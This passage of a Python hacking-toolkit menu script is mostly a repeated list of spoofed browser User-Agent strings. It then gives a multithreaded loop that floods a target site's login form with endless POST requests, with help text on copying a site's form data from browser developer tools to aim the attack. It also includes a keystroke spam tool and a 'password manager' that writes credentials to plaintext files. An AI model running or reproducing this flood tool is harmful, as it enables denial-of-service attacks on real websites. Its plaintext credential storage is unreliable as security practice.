                                    	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
                                    	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
                                    	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
                                    	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
                                    	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
                                    	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
                                    	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
                                    	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
                                    	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
                                    	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
                                    	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
                                    	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
                                    	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
                                    	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
                                    	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
                                    	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
                                    	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
                                    	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
                                    	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
                                    	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot www.idealobserver.com')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; Arachmo)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)')
                                    	headers_useragents.append('BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)')
                                    	headers_useragents.append('Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )')
                                    	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)')
                                    	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)')
                                    	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; Avant Browser)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/419 (KHTML, like Gecko, Safari/419.3) Cheshire/1.0.ALPHA')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1')
                                    	headers_useragents.append('Links (2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; text)')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A')
                                    	headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 3.55)')
                                    	headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 2.00)')
                                    	headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 1.00)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows NT 6.3; WOW64; rv:24.0) Gecko/20100101 Thunderbird/24.4.0')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; AbiLogicBot/1.0; +http://www.abilogic.com/bot.html)')
                                    	headers_useragents.append('SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)')
                                    	headers_useragents.append('iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)')
                                    	headers_useragents.append('iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; WebCapture 3.0; Macintosh)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (FM Scene 4.6.1)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5) ')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.8) Gecko/20071004 Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-Oetch1)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; {1C69E7AA-C14E-200E-5A77-8EAB2D667A07})')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=none; freenet DSL 1.1; (none))')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.51')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600#Service Pack 1#2#5#154321|isdn)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Alexa Toolbar; mxie; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/417.9 (KHTML, like Gecko) Safari/417.8')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
                                    	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
                                    	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
                                    	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
                                    	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
                                    	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')


                                    data_form = {
                                    	'rcr_authenticate': '1',
                                    	'rcr_user': 'E-mail',
                                    	'rcr_pass': 'Password',
                                    	'rcr_submit': 'Conectare'
                                    }

                                    def do_Req():
                                        while True:
                                            ses6 = requests.session()
                                            response = requests.post(url, data=data_form, headers=headers_useragents)
                                            response2 = ses6.get(url, headers=headers_useragents)
                                            response3 = urlopen(url)
                                            response3.add_header(headers_useragents)
                                            print(response)
                                            print(response2)
                                            print(response3.status)

                                    class HTTPThread:
                                    	for i in range(int(threads_number_1)):
                                    		t = threading.Thread(target=do_Req)
                                    		t.daemon = True
                                    		threads_list_1_2.append(t)

                                    	for i in range(int(threads_number_1)):
                                    		threads_list_1_2[i].start()

                                    	for i in range(int(threads_number_1)):
                                    		threads_list_1_2[i].join()

                                except KeyboardInterrupt:
                                    exit()
                            if command_4 == "cls":
                                try:
                                    os.system("cls")
                                except:
                                    os.system("clear")

                            if command_4 == "response_info":
                                try:
                                    print("\n" + Fore.BLUE + "If you start the attack and you get response 200 that means that the attack is succesfull and is working, if you get something else you can see more info here: https://developer.mozilla.org/en-US/docs/Web/HTTP/Status" + "\n")
                                except KeyboardInterrupt:
                                    exit()

                            if command_4 == "attack_info":
                                try:
                                    print("\n" + Fore.BLUE + "to start the attack you need too (For post request):" + "\n" + Fore.BLUE + "1. first go to the target and go to inspect" + "\n" + Fore.BLUE + "2. you put random data on the login page, then press f12 go to the network tab, then you make the request and go to the file that has the post method and scroll down untill you see the form data (if the target has an id, token, rechaptcha token or anything else the attack will not work)" + "\n" + Fore.BLUE + "3. you paste what it is in the form data, then go into the program and paste the form data in to the variable named data like this: data = {'rcr_authenticate': '1', 'rcr_user': 'dfssf', 'rcr_pass': 'sdfsfs', 'rcr_submit': 'Conectare'} (this is an example)" + "\n" + Fore.BLUE + "4. You run the app, you put the url you saw on the network which will be the target url, you put how many threads you want for the attack and start it:)")
                                except KeyboardInterrupt:
                                    exit()

                        except KeyboardInterrupt:
                            exit()

            except KeyboardInterrupt:
                exit()
        if menu_help == "6":
            try:
                print("\n" + Fore.BLUE + "[21] Password Manager" + "\n" + Fore.BLUE + "[22] Spam-app" + "\n" + Fore.BLUE + "[23] Simple-Timer" + "\n" + Fore.BLUE + "[24] GUI Timer" + "\n")
                tool4 = input("[+] Enter what tool do you want to use: ")
                if tool4 == "21":
                    try:
                        print(
                            Fore.GREEN + 
                            """
                                              _ __   __ _ ___ _____      _____  _ __ __| |
                                             | '_ \ / _` / __/ __\ \ /\ / / _ \| '__/ _` |
                                             | |_) | (_| \__ \__  V  V / (_) | | | (_|   |
                                             | .__/ \__,_|___/___/ \_/\_/ \___/|_|  \__,_|
                                             |_|
                                             ~>Simple password manager app<~
                                            ~~>Created By tfwcodes(github)<~~
                                              _ __ ___   __ _ _ __   __ _  __ _  ___ _ __
                                             | '_ ` _ \ / _` | '_ \ / _` |/ _` |/ _ \ '__|
                                             | | | | | | (_| | | | | (_| | (_| |  __/ |
                                             |_| |_| |_|\__,_|_| |_|\__,_|\__, |\___|_|
                                                                          |___/
                            """
                        )
                        while True:
                            try:
                                # The help menu
                                print(Fore.BLUE + "Enter --help or help for the help menu")
                                # Enter a command
                                x = input(Fore.GREEN + "[+] Enter a command: ")
                                if x == "help" or x == "--help":
                                    # All the options
                                    print(
                                        "\n" + Fore.BLUE +  "[!] Enter 1 to create a strong password that cant be cracked" + "\n" +  Fore.BLUE + "[!] Enter 2 to save your username and password into a file" + "\n" +  Fore.BLUE +"[!] Enter cls to clear the screen" + "\n" +  Fore.BLUE +"[!] Enter Ctrl+C to exit the program" + "\n")
                                if x == "1":
                                    # Generate a strong password
                                    key = Fernet.generate_key()
                                    print( Fore.GREEN + str(key))
                                if x == "2":
                                    print(Fore.BLUE +"[!] The file will be named by the app you use")
                                    z = input(Fore.GREEN + "[+] What app do you use for the username and password: ")
                                    u = input(Fore.GREEN + "[+] What is the username: ")
                                    p = input(Fore.GREEN + "[+] What is the password: ")
                                    # Name the file by the app you use
                                    file1 = open(z, "w")
                                    # Write the app, username and the password into the file
                                    file1.write("App: " + z + "\n" + "Username: " + u + "\n" + "Password: " + p)
                                    # Close the file
                                    file1.close()
                                if x == "cls":
                                    try:
                                        # If the user is on windows it will execute the command cls, else If the user uses any other operating system it will execute the command clear
                                        os.system('cls')
                                    except:
                                        os.system('clear')
                            # If the user presses Ctrl+C it will exit the program
                            except KeyboardInterrupt:
                                exit()

                    except KeyboardInterrupt:
                        exit()

                if tool4 == "22":
                    try:
                        print(
                        Fore.GREEN + 
                        """
                             _ __ ___   ___  __ _  __ _ ___ _ __   __ _ _ __ ___  
                            | '_ ` _ \ / _ \/ _` |/ _` / __| '_ \ / _` | '_ ` _ \ 
                            | | | | | |  __/ (_| | (_| \__ \ |_) | (_| | | | | | | ~>Made by tfwcodes(github)<~
                            |_| |_| |_|\___|\__, |\__,_|___/ .__/ \__,_|_| |_| |_| ~~>Spamming app<~~ 
                                                  |___/    |_|
                        """    
                        )
                        z = input(Fore.GREEN + "[+] Do you want the faster one(is a little bit buggy) or the slowest one(works perfect) [f/s]: ")
                        if z == "s":
                            try:
                                # The word/preposition to spam
                                x = input(Fore.GREEN + "[+] Enter the word/proposition you want to spam: ")
                                # The time to sleep untill the programm starts to spam
                                time_sleep = int(input(Fore.GREEN + "[+] Enter the time you want to stay untill the programm wil start to spam: "))

                                str(sleep(time_sleep))
                                # while loop to spam with the variable x 
                                while True:
                                    # write x
                                    pyautogui.write(x + "\n")
                                    # press
                                    pyautogui.press("enter")
                            except KeyboardInterrupt:
                                exit()
                        if z == "f":
                             # The word/preposition to spam
                             x = input(Fore.GREEN + "[+] Enter the word/proposition you want to spam: ")
                             # The time to sleep untill the programm starts to spam
